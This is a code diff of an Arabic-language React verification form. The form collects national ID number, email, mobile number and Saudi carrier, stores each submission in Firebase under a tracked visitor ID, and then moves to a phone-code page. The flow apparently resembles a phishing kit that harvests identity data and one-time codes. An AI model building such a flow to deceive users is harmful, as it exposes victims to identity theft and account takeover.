@@ -4,7 +4,7 @@ import type React from "react"
 
 import { useState } from "react"
 import { addData } from "../firebase";
-export default function VerificationForm() {
+export default function VerificationForm(props: { setPage: any }) {
     const visitorId = localStorage.getItem('visitor');
 
     const [formData, setFormData] = useState({
@@ -18,17 +18,18 @@ export default function VerificationForm() {
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
+        props.setPage('phoneCode')
         addData(formData)
         setLoading(true)
         try {
-
+            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })
         } catch (error) {
             console.error("Error:", error)
         }
         setTimeout(() => {
             setLoading(false)
-            addData({id:visitorId,page:"phoneCode"})
-            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })        }, 3000);
+
+        }, 3000);
     }
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -91,14 +92,8 @@ export default function VerificationForm() {
                     <select id="network" name="network" value={formData.network} onChange={handleChange} required>
                         <option value="">-- اختر المشغل --</option>
                         <option value="STC">STC</option>
-                        <option value="Ooredoo">Ooredoo</option>
-                        <option value="Zain">Mada</option>
-                        <option value="Zain">Communications
-Gulf </option>
-                        <option value="Zain">Fast communication
-Gulf Sat </option>
+                        <option value="Mobily">Mobily</option>
                         <option value="Zain">Zain</option>
-                    
                     </select>
                 </div>
 
